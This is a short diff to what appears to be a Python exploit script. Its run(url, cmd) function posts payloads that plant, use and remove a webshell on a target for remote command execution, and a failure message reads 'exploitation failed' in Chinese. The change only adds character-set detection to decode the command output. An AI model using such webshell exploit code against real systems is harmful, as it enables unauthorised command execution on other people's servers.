@@ -6,6 +6,7 @@
 """
 import random
 
+import chardet
 import requests
 
 
@@ -29,8 +30,10 @@ def run(url, cmd):
         webshell_del = requests.post(target, data=payload3, verify=False, headers=headers)
         webshell_rm = requests.post(target, data=payload4, verify=False, headers=headers)
 
+        encoding = chardet.detect(response.content)['encoding']
+        # print(response.content.decode(encoding))
         if response.status_code == 200:
-            return True, response.text
+            return True, response.content.decode(encoding)
         else:
             return False, "利用失败"
     except:
